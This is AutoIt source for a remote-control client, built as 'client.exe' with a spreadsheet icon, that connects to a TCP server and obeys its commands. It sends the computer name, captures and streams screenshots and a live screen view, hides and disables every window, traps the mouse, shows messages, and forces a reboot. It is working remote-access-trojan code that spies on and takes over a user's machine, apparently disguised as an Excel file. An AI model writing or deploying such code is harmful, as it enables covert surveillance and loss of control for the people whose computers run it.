#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=xls.ico
#AutoIt3Wrapper_Outfile=client.exe
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <ScreenCapture.au3>
#Include <Misc.au3>

;###############OTHERS#################
Global $winList[1000][2]
Global $winOriginalPositions[1000][2]
Global $toggleMouseTrap = 0
Global $liveViewEnabled = 0

;###############NETWORK################
Global $MaxLength = 30 ; 30 bytes max on every call
;packeta tou server
Global $ConnectionCheck = 			"01"
Global $RequestComputerName = 		"02"
Global $talk = 						"03"
Global $takeScreenShot = 			"04"
Global $RequestDisableAllWindows =  "06"
Global $RequestEnableAllWindows =	"07"
Global $RequestFreezeMouse	=		"08"
Global $RequestUnfreezeMouse = 		"09"
Global $RequestLiveView = 			"0A"
Global $RequestLiveViewTermination= "TerminateLV"
Global $RequestComputerRestart =    "0F"

;client packeta
Global $ReplyComputerName = 			"50"
Global $ReplySendingScreenShotFile = 	"51"
Global $ReplyScreenShotFileFinished = 	"ffin"
Global $ReplySendingLivePreviewData =   "52"
Global $ReplyTerminatedLiveView =		"TerminationSuccessful"


TCPStartup()
$i = 0
$host = "127.0.0.1"
$port=7778

Global $socket = -1

while $socket < 1 ;an yparxoun provlimata
	$ip = $host;TCPNameToIP($host)
	$socket = TCPConnect($ip,$port) ;try again until connection succeeds
	sleep(500)
wend

while 1
	if $toggleMouseTrap = 1 Then
		_MouseTrap(0,0,0,0)
	EndIf

	$data = TCPRecv($socket,$MaxLength)
	;$i = $i + 1
	;TrayTip("",$i,0)
	if @error = 10054 Then ;an error tote to connection xathike, i o server exei klisei opote (WSAGetError WSAECONNRESET 10054)
		msgbox(0,"socket error","")
		$socket = -1
		while $socket < 1 ;if there are issues with the connection
			sleep(500)
			$ip = TCPNameToIP($host)
			$socket = TCPConnect($ip,$port) ;try again until connection is restored
		wend
	EndIf
	if $data <> "" Then
		$action = StringLeft($data,2)
		$cleanData = StringTrimLeft($data,2)
		Select
			case $action = $ConnectionCheck
				msgbox(0,"check yeah","")
			case $action = $RequestComputerName
				$dataToSend = $ReplyComputerName & @ComputerName
				TCPSend($socket,$dataToSend)
			case $action = $talk
				MsgBox(0,"Admin",$cleanData,3)
			case $action = $takeScreenShot
				$screenQuality = $cleanData
				TCPSend($socket,$ReplySendingScreenShotFile)
				_ScreenCapture_SetJPGQuality($screenQuality)
				_ScreenCapture_Capture(@WindowsDir & "\screen.jpg")
				$fileHandle = FileOpen(@WindowsDir & "\screen.jpg",16)
				sleep(1000) ;wait before sending
				while 1
					$fileData = FileRead($fileHandle,$MaxLength)
					If @error = -1 Then ExitLoop
					TCPSend($socket,$fileData)
				wend
				FileClose($fileHandle)
				sleep(1000) ;wait after sending
				TCPSend($socket,$ReplyScreenShotFileFinished)
			case $action = $RequestDisableAllWindows
				$winList = WinList()
				For $i = 1 to $winList[0][0]
					If $winList[$i][0] <> "" Then						;Only windows that have a title
						$pos = WinGetPos($winList[$i][0],"") 			;Save the initial window positions, so we can restore them later.
						$winOriginalPositions[$i][0] = $pos[0]
						$winOriginalPositions[$i][0] = $pos[1]
						WinMove($winList[$i][0],"",@DesktopWidth + 20,0) ;move all windows 20 pixels to the right out of the screen.
						WinSetState($winList[$i][0],"",@SW_DISABLE)		 ;disable the windows
					EndIf
				Next
			case $action = $RequestEnableAllWindows
				if $winList[0][0] > 1 Then								;In case admin chooses enable before they have a chance to get disabled and if the windows are more than 1,
					For $i = 1 to $winList[0][0]
						If $winList[$i][0] <> "" Then						 ;For the windows that have a title
							WinMove($winList[$i][0],"",$winOriginalPositions[$i][0],$winOriginalPositions[$i][1]) ;move the windows to their initial positions
							WinSetState($winList[$i][0],"",@SW_ENABLE)		 ;activate windows
						EndIf
					Next
				EndIf
			case $action = $RequestFreezeMouse
				$toggleMouseTrap = 1
			case $action = $RequestUnfreezeMouse
				_MouseTrap()
				$toggleMouseTrap = 0
			case $action = $RequestComputerRestart
				Shutdown(BitOR(2,4)) ;force restart
			case $action = $RequestLiveView
				$liveViewEnabled = 1
				$screenQuality = $cleanData
				TCPSend($socket,$ReplySendingLivePreviewData)
				while $liveViewEnabled
					if TCPRecv($socket,$MaxLength) = $RequestLiveViewTermination Then ;In case there is a live view termination packet
						$liveViewEnabled = 0													  ;exit loop
					EndIf
					_ScreenCapture_SetJPGQuality($screenQuality)
					_ScreenCapture_Capture(@WindowsDir & "\screen.jpg")
					$fileHandle = FileOpen(@WindowsDir & "\screen.jpg",16)
					;sleep(100) ;wait before sending
					while $liveViewEnabled
						$fileData = FileRead($fileHandle,$MaxLength)
						If @error = -1 Then ExitLoop
						TCPSend($socket,$fileData)
					wend
					FileClose($fileHandle)
 					sleep(100) ;wait after sending
					TCPSend($socket,$ReplyScreenShotFileFinished)
				wend
				Sleep(1000)
				TCPSend($socket,$ReplyTerminatedLiveView)
			case else
		EndSelect
	EndIf
wend
TCPShutdown()